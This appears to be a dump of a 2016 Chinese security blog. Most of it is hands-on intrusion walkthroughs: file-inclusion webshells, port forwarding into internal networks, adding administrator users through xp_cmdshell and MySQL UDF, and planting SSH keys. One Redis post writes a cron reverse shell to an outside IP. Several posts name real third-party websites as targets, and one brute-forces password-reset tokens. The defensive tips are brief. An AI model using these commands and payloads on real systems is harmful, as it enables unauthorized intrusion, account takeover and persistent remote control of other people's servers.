require_once()漏洞分类:本地文件包含 ， 远程文件包含漏洞利用:本地文件包含(上传图片，图片getshell)(读文件，读php文件)(包含日志文件getshell)(包含/proc/self/environ文件getshell)(如果有phpinfo可以包含临时文件)(包含data://或php://input等伪协议:需要allow_url_include=On)远程文件包含(包含远程txt文件的前提条件是有远程文件包含漏洞的服务器的php.ini的配置项allow_urll_fopen和allow_url_include为ON)(包含远程txt文件：远程服务器存放一个txt文件，或者而不被解析的php文件：包含的时候，包含的是hi返回的php源代码，所以php源代码不能被解析)测试流程：详见 文章file contains(文件包含)扩展：%00截断 ： ?file=../../../../../../../../../etc/passwd%00%00截断目录遍历 ： ?file=../../../../../var/www/%00()(需要 magic_quotes_gpc=off,unix文件系统，例如 freebsd ,openbsd , netbsd)路径长度截断 ： ?file=../../../../../etc/passwd../../../../[…]../.././.(php版本小于5.2.8 可以成功，linux需要文件名长于4096，windows需要长于256点后截断 ： ?file=../../../../../../boot.ini/………………[…]………….(php版本小于5.2.8 可以成功，只适用windows,点好需要长于256) 防御：php中可以使用open_basedir配置限制访问限制在指定的区域， 过滤. / \\ , 禁止服务器远程文件包含 0x03.6：后台相关功能获取webshell数据库备份数据库恢复文件管理功能","tags":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/tags/web安全/"}]},{"title":"Port Forwarding (端口转发)","date":"2016-08-10T12:34:28.000Z","path":"2016/08/10/Port-Forwarding-端口转发/","text":"端口转发EarthWorm0x01测试服务器：自己主机，目标服务器，公网服务器 0x02测试思路：因为目标服务器是内网，自己主机无法进行远程连接，通过云服务器进行端口转发，达到访问目标主机的目地 0x03测试前提：以拿到webshell,但目标是内网地址，需要端口转接0x04测试流程：首先我们需要在公网服务器上开启一个服务使用下列命令 ./ew -s rcsocks -l 1080 -e 8888 接着我们利用大码上传到目标服务器并启动socks v5 服务，并反弹到公网的8888端口 ./ew -s rssocks -d 1.1.1.1 -e 8888 我们还需要开启一款代理软件（proxifier或者sockscap）其中我们的代理服务器地址是我们的公网服务器地址，端口号1080 Ok 现在我们进行远程连接该内网服务器了 Lcx （仅限windows服务器）0x01测试思路：我们在公网将8888 过得全走向500端口，然后将被攻击者的服务器与公网的500端口绑定，我们来访问公网的ip，达到访问被攻击者内网的目地 0x02测试步骤：很简单，仅仅需要两条命令攻击者：lcx.exe -listen 500 8888（公网上）被攻击者：lcx.exe -slave 公网ip 500 被攻击者ip 3389攻击者：远程连接 公网ip：8888 总结：判断web是否为内网 Ping域名，查看ip是外网，用webshell查看ip却是内网ip","tags":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/tags/web安全/"}]},{"title":"linux mention the right and Free password (Linux的提权和自由密码)","date":"2016-08-10T03:26:51.000Z","path":"2016/08/10/linux-mention-the-right-and-Free-password-Linux的提权和自由密码/","text":"Linux 提权以及免密码登录linux提权0x01测试服务器：10.22.5.700x02测试方法：利用linux系统漏洞进行提权，接着实现免密码登录 0x03测试步骤：getshell之后，先查看一下权限，以及版本号（通过一些网站查到该版本号漏洞利用）反弹一下执行whoami 通过wget或者 curl 下载源码下好之后head，按照提示使用gcc进行安装gcc xxx.c -0 111 -lpthread (xxx.c 是使用curl 将源码指向到一个的文件) ./执行之后， enter一下之后进入提权成功 免密码登录0x01测试前提：自己服务器上有公私秘钥0x02测试思路：将自己公钥放到目标主机上，实现免密码登录0x03测试步骤：使用命令 ssh-keygen 创建一对公私秘钥（自己服务器上）我们将自己的公钥echo到目标服务器.ssh/authorized_keys 里面这里需要.ssh 和 authorized_keys 是700 和600 权限 （这里也可以利用另一种方法）将公钥以文本方式保存到目标主机的tmp 目录下，cat指向到authorized_keys中Cat /tmp/222 &gt; authorized_keys此时是在.ssh 目录下（另另一种方法）快速搭建服务器在自己服务器上输入命令python -m SimpleHTTPServer 8080 端口自定接着我们在浏览器输入自己ip:8080 可以直接访问 这时候我们在目标主机上 直接curl 指向到.ssh/authorizde_keys 就可以了 直接就ssh远程免密码登录了","tags":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/tags/web安全/"}]},{"title":"mssql_mysql mention the right (mssql.mysql提权)","date":"2016-08-08T02:17:49.000Z","path":"2016/08/08/mssql.mysql mention the right mssql.mysql提权/","text":"Sql server 提权0x01测试目标：利用sql server 提权 0x02测试环境：ip:10.22.5.62 ,获得一定的权限之后 0x03测试思路：通过大码拿到服务器,发现权限不足，通过写入另外第二个大码，实现后一个大码的sql server 提权，最终远程连接到对方电脑 0x04测试步骤：（检测在上一文章以有描述）我们拿到一个网站shell后，发现权限不足，通俗的讲，通过写入一个更厉害的大码来进行操作，一般放到站点跟目录 成功后输入url进入界面，选择数据库，这里我们选择mssql ,在connstring 中会自动生成一些信息，我们需要做的就是放入密码（实际情况下，密码是在连接数据库配置文件中找到） 我们来到了这里，如果存在master 就是dba 权限（sa权限） 验证执行一下能否命令注：提示组件被关闭 开启组件利用下列代码USE master;EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure ‘show advanced options’, 0;RECONFIGURE WITH OVERRIDE;(关闭的话，将中间的1 设为0) 执行这一步的话没有回显，但是我们已经可以执行命令了 我比较懒，直接改了已经存在用户的密码 远程连接Logoff 退出 0x05扩展:查看用户Exec master.dbo.xp_cmdshell ‘net user’更改密码Exec master.dbo.xp_cmdshell ‘net user xxx zxc123’加入管理员用户组Exec master.dbo.xp_cmdshell ‘net localgroup administrator xxx /add’激活用户Exec master.dbo.xp_cmdshell ‘net user xxx /active:yes’查看当前正在运行的用户Exec master.dbo.xp_cmdshell ‘query user’ 提取哈希密码（使用工具w_32.exe）Exec master.dbo.xp_cmdshell ‘c:\\inetpub\\wwwroot\\w_32.exe’ Mysql数据库提权0x01测试网站：10.22.5.60 0x02测试方法：通过udf进行提权 0x03测试步骤：拿到网站shell后，浏览下网站信息，执行下命令，查看是用户什么权限 很显然，它只是一个低权限的users, 上传udf.php进行提权(在) 在分别点击dump udf create function 之后，下方会产生一条语句 查看一下用户 有了权限执行命令，后面就简单的多了，创建用户，提升管理组，远程连接。（命令可参考上例扩展） 0x04扩展：Mysql 5.1以下版本导出路径：c:\\winnt\\udf.dll 2000c:\\windows\\udf.dll 2003 (有的系统被\\转义，需要改为c:\\windows\\udf.dll)导出dll文件时需要注意导出路径（一般情况下对任意目录可写，无需考虑权限问题）Mysql5.1 以上版本必须要把udf.dll文件放到mysql安装目录下的lib/plugin文件夹下才能自定义创建函数可以在mysql里输入Select @@basedir 寻找mysql安装路径需要注意的是：该目录默认是不存在的，需要我们用webshell找到 mysql的安装路径，并在安装目录下创建lib\\plugin文件夹，然后将udf.dll 导出到该目录就好","tags":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/tags/web安全/"}]},{"title":"After get webshell (getshell 之后?)","date":"2016-08-05T14:16:38.000Z","path":"2016/08/05/After-get-webshell-getshell之后？/","text":"拿到Webshell之后怎么办0x01测试服务器：10.22.5.62 0x02测试工具：iis.exe cmd.exe 0x03测试步骤拿到webshell 后查看组件信息是否开启了命令执行 端口信息 然后执行以下命令测试能否成功 这时候我们需要找一个可读可写的文件 执行cmd文件 这时候我们发现服务器支持.aspx 格式文件，上传大码利用该.aspx文件(权限较高)上传cmd.exe（为利于测试，直接上传到站点跟目录下） 返回原网页执行命令whoami,也可以直接在.sapx 中操作 执行命令查看一下systeminfo(查看补丁版本利用) 利用一段代码： systeminfo&gt;C:\\Windows\\Temp\\temp.txt&amp;(for %i in (KB3057191 KB2840221 KB3000061 KB2850851 KB2711167 KB2360937 KB2478960 KB2507938 KB2566454 KB2646524 KB2645640 KB2641653 KB944653 KB952004 KB971657 KB2620712 KB2393802 KB942831 KB2503665 KB2592799 KB956572 KB977165 KB2621440) do @type C:\\Windows\\Temp\\temp.txt| @find /i “%i”|| @echo %i Not Installed!)&amp;del /f /q /a C:\\Windows \\Temp\\temp.txt 显示未安装的补丁 这时候我们需要利用工具iis.exe，按照之前的过程，下载iis 到站点跟目录 在cmd命令下执行：c:\\inetpub\\wwwroot\\iis688.exe “whoami” 这时候我们要考虑的是怎么给自己一个账户 修改管理员账号密码 添加一个管理员 读取管理员账户密码（需要管理员账户密码没有注销） 木马种植，远程控制 我在这里选择的是新添一个管理员stone（测试快）命令： c:\\inetpub\\wwwroot\\iis688.exe “net user stone STONE123/add” 提升权限到管理员命令： c:\\inetpub\\wwwroot\\iis688.exe “net localgroup administrators stone /add” 成功连接Logoff 退出 0x04问题：为什么开始getshell 的时候不直接.aspx后缀大上传不支持上传.aspx ，我们在这里实现的是写了一个aspx文件 Asp 和aspx 后缀的文件有什么不同.aspx是用asp.net语言编写，安全性比较高.aspx只能用于windows下面，.asp是asp语言编写，是最基本的网页制作的语言 0x05 扩展:修改系统帮助账号为管理员(以上为例)设置密码 “Net user support_388945a0 stonebig@#”添加这个用户到管理组 “Net localgroup administrators support_388945a0 /add”启用这个账户 “Net luser support_388945a0 /active:yes”提取管理员密码 “query user”使用工具getpassword_32.exe “c:\\inetpub\\wwwroot\\Getpassword_x32.exe”","tags":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/tags/web安全/"}]},{"title":"webshell access (webshell的获取)","date":"2016-08-05T00:31:23.000Z","path":"2016/08/05/webshell access webshell的获取/","text":"Webshell的获取以及该静态查找的一些特征0x01: 《谷歌语法》Intext:thinkphp intext:”fast &amp; simple OOP PHP framework” intext:”2.1” Inurl:php?id=公司 0x02: 《漏洞类型》 任意代码执行漏洞webshell任意上传漏洞webshell（由sql注入引发） 0x03: 《具体步骤》一 任意代码执行找到网站后先进行测试 测试发现存在漏洞后，先进行一些简单信息的验证，例如路径的获取 不多说，直接传一句话 二 任意上传手注拿到密码，随意测试找到后台，进入管理系统（主要上传漏洞步骤） 大致浏览后找到上传点，并且直接可以在网站主页访问到：路径知晓（已上传正常图片测试成功） 直接上传jpg 格式的大码在我们访问图片的时候提示错误，并没有成功连接 进行burp 抓包改包 这个时候我们找到上传的图片，右键点击查看图片，输入密码后 这里只做测试，直接退出 0x04: 《防御》任意代码执行：eval 正则替换e修饰符后台上传漏洞：黑白名单，删除数据库备份和恢复， 0x05: 《事例总结》任意代码执行漏洞不多说，只要存在该漏洞，简单几步就可拿到webshell后台任意上传:首先需要判断的上传点是自写的代码上传还是编辑器上传，如果是编辑器上传好说，直接百度该编辑器版本号查询对应版本号漏洞解析，一步一步执行就ok如果是自写的代码块上传，第一我们先做的是上传一张正常的图片，能否网站上找到，用来判断路径，第二继续上传一张正常的jpg图片，使用burp 拦截，修改后缀为php (检测了 绕前端，文件类型检测， mime类型) 第三继续上传一个正常jpg 图片，burp拦截，进行%00截断 第四判断服务器是什么类型、web服务器程序、什么类型、版本多少、利用解析漏洞注：（以上顺序是建立在上一步不能成功上传木马的前提下的） 0x06: 《简单了解webshell 静态检测特征》静态检测是指对脚本文件中所使用的关键字，高位函数，文件修改时间，权限，所有者等等的多个维度的特征性检测优点：可快速检测，快速定位缺点：容易误报，无法对加密或者特殊处理的webshell文件进行检测","tags":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/tags/web安全/"}]},{"title":"command execution vulnerabilities and dedecms (命令执行和dedecms)","date":"2016-08-03T13:01:47.000Z","path":"2016/08/03/struts2 command execution vulnerabilities and dedecms命令执行漏洞和dedecms漏洞/","text":"Struts2 命令执行漏洞以及dedecms 漏洞事例struts2 命令执行0x01漏洞原因：struts2漏洞的核心是使用webwork框架，处理action时通过调用底层的getter/setter方法来处理http的参数，并且将http参数声明为一个ongl 语句，在这里经过恶意利用后只要有权限就可以执行任意dos命令（近期大多是命令执行漏洞） 0x02测试网站： www.powermach.com.tw/guestMaintain!login.action 0x03测试工具： k8 struts cknif 0x04 测试步骤： 拿到网站后放到k8 struts2 工具下扫描下 执行命令，查看什么权限 上传小码回显成功后，我们使用菜刀连接 0x05:总结 使用工具很简单，找到站点测试，然后上传码，菜刀连 dedecms 漏洞0x01：Google语法 inurl:”/dade” 管理登录 0x02：测试网站： http://www.zndjw.gov.cn/dede/index.php 0x03：测试步骤 网站登录后台 弱口令登录 大致浏览一下，找到上传点，上传测试内容 上传成功后，访问下 得到路径后，上传一句话，或者大码 ，连接即可获得shell0x04：防御 移除install目录0x05:总结 过程很简单，唯一的一点困难就是后台登录，有的密码强度比较大的，也可去测试网站是否有sql注入，在一个是找准上传点，需要注意的是要获得上传路径，否则无法进行下一步。Dedecms在国内使用范围很多，默认在apache环境下，很容易拿到shell，危害较大","tags":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/tags/web安全/"}]},{"title":"About redis","date":"2016-08-03T11:13:27.000Z","path":"2016/08/03/About-redis/","text":"redis（ webshell ,ssh免密码登录，计划任务）测试服务器：两台个人服务器思路：6379端口 写webshell 在redis后台开启服务端后， 我们可通过redis.cli 进行远程连接在得知网站根目录的情况下，通过redis 将一句话写入网站跟目录 免密码登录 通过redis将公钥写入被攻击的服务器中，以得到ssh 连接的目地1 首先将自己的公钥放到一个临时目录中，2 使用语法 将公钥写入 redis 中3 更改redis目录*提前须知：网站根目录在哪里（一般默认在usr/local/nginx/html） Redis.conf 文件中有bind 0.0.0.0（默认#bind 127.0.0.1） .ssh 目录的权限为700 Authauthorized_keys 的权限为600 Redis写计划任务 利用redis 将反弹计划书 上传到对方服务器 ,链接redis 使用命令上传计划 Ssh 获得shell下载redis 并且make安装 wget http://download.redis.io/releases/redis-2.6.17.tar.gz 首先我们找到src目录下的执行文件redis-cli ,通过这个文件，我们可远程访问redis语法： ./redis-cli -h 192.168.233.11 -p xxxx 我们进入了redis ,可以在查看一些以及一些简答的操作 使用命令config get * 查看所有的配置文件，并且找到dir 以及 dbfilename 我们可以在这里建立一对值，并将值可以改为&lt;?php phpinfo()?&gt;并且使用命令将dir放到网站跟目录,并将文件名改为22.php Set ww “&lt;?php phpinfo();?&gt;” Config set dir /usr/share/nginx/html/ Config set dbfilename 22.php注：有的地方因为框框限制被隐藏了 现在我们可以去网上跟目录上查看22.php文件 写一句话类似此过程 ssh 免密码登录首先我们要了解ssh 链接的原理，可自行google思路：将自己的公钥通过redis 写到对方服务器上的，以达到远程登录的目地 将自己的公钥保存在一个临时目录中，首先查看一下自己的公钥 (echo -e “\\n\\n”; cat ~/.ssh/id_rsa.pub; echo -e “\\n\\n”) 这是我们的公钥,将它写到一个临时文件中 (echo -e “\\n\\n”; cat ~/.ssh/id_rsa.pub; echo -e “\\n\\n”) &gt; /tmp/foo.txt 使用命令将该文件写入redis中 (cat /tmp/foo.txt | ./redis-cli -h 192.168.233.11 -x set ssh ) 注（记得切换到redis/src目录下）查看一下ssh 下面我们更改目录 Config set dir /root/.ssh Config set dbfilename authorized_keys 查看一下被攻击的服务器.ssh/authorized_keys,之前并没有内容，（当然了，实际情况下我们不能直接看对方的这个文件） 测试登录 1 进行ssh 登录对方的服务器2 第一次登录输入的自己建立公钥私钥的密码3 离开localhost4 回到root2 防御： 设置不对外访问 bind 127.0.0.1添加redis 密码 扩展： ssh 免密码登录的原理生成一对公钥私钥后，将公钥放到需要访问的服务器上，通过ssh 服务器，进行配对，来达到免密码登录的原理 为什么可以直接远程登录redis 默认的无密码链接redis可在config requirepass foobared中进行设置 公钥 私钥 和auth 的关系 公钥一般存放在id_rsa.pub中，私钥一般存放在id_rsa 而authorized_keys 就是相当于接收别人公钥的地方 公钥给谁？如何给 将公钥给想要访问的服务器，那么以ssh 登录时，会自动进行公钥私钥配对。本测试过程中，是通过redis 更改目录，以及文件名平时的话 复制粘贴 Dir 和 dbfilename 有什么联系 Dir 是指定本地数据库存放目录Dbfilename 是指定本地数据库文件名，默认值为dump.rdb*在redis 中config set 方法是一次性更改 计划任务测试服务器： 两台自己的服务器思路：利用redis 将反弹计划书 上传到对方服务器 ,链接redis 使用命令上传计划 写入一对键值 并将值编写为一段计划任务 目录以及文件的更改 &quot;\\n\\n\\n*/1 * * * * /bin/bash -i &gt; &amp; /dev/tcp/192.168.233.22/5555 0&gt;&amp;1 \\n\\n\\n&quot; 每分钟执行一次反弹shell 监听的端口5555 注： 计划格式严格遵守 完成链接 总结问题：计划任务不能反弹到客户端想法：一，先查看能否反弹shell ,在客户端进行监听状态，服务端命令行反弹shell 二，服务端自建一段计划任务，是否能执行","tags":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/tags/web安全/"}]},{"title":"web middleware Vulnerability (网络中间键漏洞) ","date":"2016-08-03T09:51:14.000Z","path":"2016/08/03/web middleware Vulnerability 网络中间键漏洞/","text":"常见web中间件漏洞tomcat manager 管理界面 getshell测试服务器： 10.22.66.6理解：tomcat manager是tomcat自带的，用于对comcat自身以及部署在tonmcat上的应用进行管理的web应用。思路：一般的manager管理界面是弱口令登录，我们可以尝试登录，登录成功后上可getshell进入manager 管理界面，一般是8080端口 找到管理app 进行弱密码登录 接着我们可以在这里上传小码，达到getshell的目地 看这里 是的我们必须上传.war 格式的我们将js代码先压缩成.tar 接着将.tar 更改为.war，就这样简单的操作一下就可以了 上传内置js码的.war 文件 我们在下面的路径中找到我们的这个文件夹 问题：为什么会是文件夹？ 因为我们上传的是一种压缩包格式，它会自动解压创建一个目录，里面存放的就是我们需要js代码 使用菜刀连接 防御： 删除manager密码复杂化 php-fpm 远程代码执行测试服务器： 192.168..思路： 拿到网站后工具扫描 - -前提条件： listen=0.0.0.0:9000 ;Listen.allowed_clients =127.0.0.1执行程序 查询敏感文件 问题 火狐浏览器不能访问 9000端口原因 因为php-fpm 是fastcgi协议 ，必须使用fastcgi协议的客户端，才能链接 防御：设置不对外访问将上诉前提条件关闭即可","tags":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/tags/web安全/"}]},{"title":"file contains (文件包含)","date":"2016-08-01T09:26:36.000Z","path":"2016/08/01/file contains 文件包含/","text":"文件包含漏洞测试网址：本机服务器 漏洞成因：在引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入 选择图片上传，这里只允许上传jpg 我们构造一个破碎的jpg图片，里面可写上一句话话木马(这是理想情况下的实验环境) 我们访问这个地址 接着我就可以使用菜刀 这期间我们可以利用这个漏洞的特性，来读取一些敏感文件 读php文件利用的是伪协议方法 http://192.168.233.11/file_contains/index.php?page=php://filter/read=convert.base64-encode/resource=1.php 解密之后就是 &lt;?phpphpinfo();?&gt; 也可以包含日志文件getshell 思路：首先找到日志文件存放位置，让日志文件插入到php代码，包含日志文件 因为这个是nginx 服务器，一般情况下配置文件在这里，通过这些我们继续找到了日志文件的存放地 问题：期间无法访问error.log 原因：web服务器是以nginx用户运行，当时搭建nginx服务器的时候默认的是最低权限（权限是越低越安全），所以出现了无法打开error.log的问题 输入error.log 的路径 这证明了我们可以访问到错误日志 下面我们将phpinfo（） 写入到日志文件中，开始构造语句问题：error:log和access.log理解不清楚Error日志：以php为例 error是脚本错误日志，php代码出错的日志，也就是apache处理不了的就放到error.logaccess日志：我们在浏览器访问网页时产生的一个记录（不论是正确的还是错误的） 这个时候我们随便输入串字符串将&lt;?php phpinfo();?&gt;插入其中 ，然后访问日志Page=/etc/pas&lt;?php phpinfo() ?&gt;swd这个地方被转译了 有两种方法可以将更改为我们想要的格式1 通过git :2 通过bursuite 抓包改包 通过这两种方法中我们不难看出，转译的时期是在浏览器也就是客户端转译的 phpinfo 可以显现这也就证明我们日志文件包含成功，下面只需要将phpinfo（） 换为一句话就可以进行菜刀连接 远程文件包含漏洞说明：如果php.ini的配置选项allow_url_fopen和allow_url_include 为on 的话，则文件包含函数是可以加载远程文件的，这样的就叫做远程文件包含 我们需要一个外网服务器，可以在上面放一个1.txt具体实现：page=http://xxxxxxxxxxxx/1.txt也可以是page=http://xxxxxxxxxxxx/1.txt?page=http://xxxxxxxxxxxx/1.txt?%00这里的？和%00 都是起到一个截断的作用 修复：1 php中可以使用open_basedir 配置限制访问在指定的区域（只能访问该函数指定的目录）2 过滤 . / \\3 禁止服务器远程文件包含","tags":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/tags/web安全/"}]},{"title":"Ethereal phone (手机抓包)","date":"2016-08-01T00:32:13.000Z","path":"2016/08/01/Ethereal phone/","text":"如何设置burp进行手机抓包首先我们需要手机wiff与电脑在同一个网段，不明白的话直接用第三方软件开个wiff,我使用的是360wiff 查看自己的ip (这个地方是我们的360wiff ip)在这里我们要确保手机服务端和这个ip地址保持一致 在这里我们需要将手机服务器和wiffip 保持一致 接下来我们需要配置burp 在这里我们将 interface 设置为刚刚手机wiif 下面代理一项，包括端口号保持一致打开手机程序 即可抓包","tags":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/tags/web安全/"}]},{"title":"Logical loopholes (逻辑漏洞)","date":"2016-08-01T00:13:57.000Z","path":"2016/08/01/Logical-loopholes-逻辑漏洞/","text":"逻辑漏洞事例一 邮箱验证测试网站：www.menle.com思路：点击更改密码之后会发送邮箱链接，点击这个链接后可以进入设置新密码，我们需要做的就是分析和构造这个链接，最终完成新密码的设置。 首先使用自己账号就行测试，打开主页，点击忘记密码，选择以邮箱方式找回输入自己的邮箱账号，发送链接 发送验证链接，打开邮箱 分析链接http://www.menle.com/index.php?m=CustomerService&amp;a=resetPwdEmail&amp;token=MTQ1NzgzOTU0MEBxcS5jb20mNjMwMA== 重复发送几次后，会发现前面构造一样，变化的是token的这部分 MTQ1NzgzOTU0MEBxcS5jb20mNjMwMA== NjMwMA==分析得知发现这是base加密，解开后发现是下列部分 1457839540@qq.com&amp;6300 6300通过上诉我们可以得知：该链接变化的部分是6300，我们需要通过获取一个正确随机码来达到进入更改新密码的地方 开始测试（以1457839540@qq这个邮箱为例，期间我们不会打开邮箱来点击链接） 构造以及抓包http://www.menle.com/index.php?m=CustomerService&amp;a=resetPwdEmail&amp;token=99999999 开始暴力猜解下列是一些详细配置 更改验证（判断对错）箭头指向的地方意思是 返回上一级，返回的就证明是错误的 当猜解成功后，我们可以得知该验证码验证码为9521 http://www.menle.com/index.php?m=CustomerService&amp;a=resetPwdEmail&amp;token=MTQ1NzgzOTU0MEBxcS5jb20mOTUyMQ== 原理上点击这个我们构造的url即可进入更改密码的页面，但是实际上在进行burp 猜解的时候已经请求过这个链接了，因为链接点击一次有效的前提下，这个链接已经失效了，所以我们想真正通过这种方法更改密码的时候需要编写一个程序，在 burp猜解这个验证码是否正确的时候自动填写新密码 二 手机短信验证码逻辑漏洞测试网站： www.xm030.com思路：先测试验证码是几位，然后进行burp抓包，暴力猜解，输入验证码 ### 进入找回密码界面 抓包，暴力猜解 发现验证码小方法：验证码是唯一的 所以唯一的那个就是我们所需的正确的验证码 输入验证码，更改成功 总结问问题不要啊急于表面，自己独立能否独立完成，记得检验一遍，原理，过程都熟悉吗?例一为什么在猜解后，不能将后4位的随机码进行加密后构造urL重新放到浏览器中打开进入密码的更改页面原因：1 我们在自己构造的url被抓包之后，与原来的没有任何关系，可随意更改，因为服务端真正发出的链接还在邮箱中没有被点开2 在使用burp猜解 我们在这个地方获得了正确的验证码，但是是burp猜解的原理是发出请求，返回正确及判断为正确的验证码，邮箱改密有都会有一个特性，一次之后自动失效，所以我们及时构造好url也不能在使用这个验证码进行更改新密码了，想要更改新密码，需要利用程序自动将想要更改的密码写入 请求中即可","tags":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/tags/web安全/"}]},{"title":"web_tools (web的一些小工具)","date":"2016-07-31T15:37:30.000Z","path":"2016/07/31/web-tools/","text":"一 whatweb理解：一款网站指纹识别工具，可以识别版本号，emai地址，ip,web服务器等。测试网站：www.nynu.edu.cn使用方法：./whatweb www/nynu.edu.cn 二 cms_identify理解：扫描cms 类型和版本使用方法：python identify_cms.py 网址 三 BBScan理解：小型的信息泄露批量扫描工具使用方法：1 扫描单个web服务 www.tianlonghotel.com.cn python bbscan.py –host xxx –browser2 扫描 xxx 和xxx/28 下的其它主机 python bbscan.py –host xxx –network 28 –browser3 扫描txt 文件中的的所有主机 python bbscan.py -f 111.txt –browser4 从文件夹中导入所有的主机并扫描 python bbscan.py -d 111/ –browser5 把域名保存到111 文件夹下python bbscan.py -d 111/ –network 30 –browser 四 weakfile理解：扫描该网站的信息使用方法：python wysqider.py www.zzrvtc.edu.cn可以扫到一些路径，和文件 五 github 信息搜索1 搜索文件中有xxx的代码 Xxx in:file2 搜索路径中带有xxx的代码 Xxx in:path3 1和2可以混用 Xxx in: file,path4 搜索包含integer的字段 Integer5 搜索mozilla用户下用markdown写的代码 User:mozilla language:markdown6 搜索与function相关的python代码，文件大小超过10kb Function size:&gt;10000 language:python7 在111/222/333目录下搜索xxx关键字 Xxx path :111/222/333 language:8 搜索cgi-bin 目录下包含formde 的perl代码 Form path:cgi-bin language:perl9 搜索文件名匹配 111 并且包含222的代码 Filename: 111 22210 搜索cgi-bin目录下以py为扩展名的代码 Form: path cgi-bin extension:py","tags":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/tags/web安全/"}]},{"title":"Any loophole to download (任意代码下载漏洞) ","date":"2016-07-31T14:55:38.000Z","path":"2016/07/31/Any-loophole-to-download/","text":"代码下载漏洞google语法：inrul:&quot;readfile.php?file=&quot; 网址：http://www.wodehouse.se/upload/readfile.php?file=全文 思路：任意漏洞下载是因为一般的网站提供了下载文件功能，但是在获得文件到下载文件的时候并没有进行一些过滤，这就导致了漏洞的产生。 拿到网站，进行测试http://www.wodehouse.se/upload/readfile.php?file=收费的 测试的时候仅仅是写index.php 一般是不行的，我们需要在前面加../,这是又的时候我们并不是在一级目录 ./, ../, ../../ 查看实现下载功能的它的php文件http://www.wodehouse.se/upload/readfile.php?file=readfile.php地 在这个地方实现的功能时下载header函数 是向客户端发送原始的http报头分析：开始的时候get到一个file ,中间是对这个file的定义，后面直接readfile，中间并没有进行过滤的操 作，这就是产生漏洞的原因 查看index.php 在该目录下输入路径，可下载到该php文件 http://www.wodehouse.se/upload/readfile.php?file=../2016/wp-blog-header.php 问题：这个地方出现了两个php文件地址，在我输入第一个时候犯了一个错误，在写这个路径的时候并没有将之前的2016路径加上，导致了这个文件一直不能下载 打开php文件 走到这里很疑问，不知道该找那些文件，获取什么信息（掌握的深入） 利用这些配置文件可以查找网站的一些信息，如果不觉得麻烦的话，脱ku也是没问题的 二 打开一个网址，进行测试http://lacphap.com/files/readfile.php?file=index.php 测试的时候直接下载了index.php， 说明该目录直接在跟目录下 下载下载文件的配置文件http:lacphap.com/files/readfile.php?file=readfile.php 同理得到 readfile.php 打开并分析readfile.php文件分析: 该例上上面的大致相同，在下载文件的时候并没有进行过滤，导致了漏洞的产生 也可以利用该目录读到passwd, 或者包括一些敏感文件 shadow总结 漏洞产生的原因查看下载功能的php文件我们可以得知存在漏洞的原因，一般是在get到一个请求和下载这个请求之前没有进行过滤 如何防止下载漏洞a 将. 过滤，这样就无法使用返回上级目录功能../b 正则判断c open_basedir 中可以设置访问权限 在下载过程中无法得知在几级目录可以用./ ../ 逐个进行尝试 为什么一些敏感文件无法再win 中打开提示无法读取源代码open_basedir扩展：open_basedir=/etc/user 那么可以访问/etc/user 或者/etc/nameopen_basedir=/etc/user/ 那么只能访问/etc/user/下面的目录","tags":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/tags/web安全/"}]},{"title":"Set up the blog (建立博客)","date":"2016-07-31T05:08:31.000Z","path":"2016/07/31/Set-up-the-blog(建立博客)/","text":"Github博客的搭建过程环境我们需要一个git ,以及node.js的安装过程，下方有链接https://git-scm.com/download/winhttps://nodejs.org/en/ 安装hexo 这个可以利用npm命令即可安装(桌面右键 git bash here ,这里进入命令模式): Npm install -g hexo 创建hexo文件夹在任意地方创建文件夹完成后，在这个文件下右键git bash here 进入命令行模式: Hexo init这样hexo 会自动在这个文件夹中建立网站所需要的所有文件。 安装依赖: Npm install 这个时候我们已经搭建起本地的hexo博客了，接着执行命令: hexo generate (hexo g): hexo server (hexo s)这个时候我们可以访问localhost:4000 来看下我们的博客了 Or error / 执行hexo server 提示出错 找不到不要担心：在hexo 3.0 后server 被单独出来了，需要安装server : npm install hexo -server –save然后重复刚刚的步骤 我们选择使用https 这种协议的方法登录，每次推送的时候需要输入用户名和密码Git config –global user.name ”your name”Git config –global user.ermail “your email”Npm install hexo-deployer-git –save 6 现在开始注册账号，有的话直接登录然后右下角点击new repository 接着给新建的仓库命名，这个地方要注意格式以xxx.github.io 格式命名 hexo 使用（这里的hexo 就是刚刚的创建的文件下）我们打开后，里面会有生成的一些文件夹├── .deploy #需要部署的文件├── node_modules #Hexo插件├── public #生成的静态网页文件├── scaffolds #模板├── source #博客正文和其他源文件，404、favicon、CNAME 都应该放在这里| ├── _drafts #草稿| └── _posts #文章├── themes #主题├── _config.yml #全局配置文件└── package.json这是网上已经整理好的一大概 现在我们开始配置 hexo下的_config.yml文件 也就是全局配置Hexo Configuration## Docs: http://hexo.io/docs/configuration.html## Source: https://github.com/hexojs/hexo/# Site #站点信息title: #标题subtitle: #副标题description: #站点描述，给搜索引擎看的author: #作者email: #电子邮箱language: zh-CN #语言# URL #链接格式url: #网址root: / #根目录permalink: :year/:month/:day/:title/ #文章的链接格式tag_dir: tags #标签目录archive_dir: archives #存档目录category_dir: categories #分类目录code_dir: downloads/codepermalink_defaults:# Directory #目录source_dir: source #源文件目录public_dir: public #生成的网页文件目录# Writing #写作new_post_name: :title.md #新文章标题default_layout: post #默认的模板，包括 post、page、photo、draft（文章、页面、照片、草稿）titlecase: false #标题转换成大写external_link: true #在新选项卡中打开连接filename_case: 0render_drafts: falsepost_asset_folder: falserelative_link: falsehighlight: #语法高亮 enable: true #是否启用 line_number: true #显示行号 tab_replace:# Category &amp; Tag #分类和标签default_category: 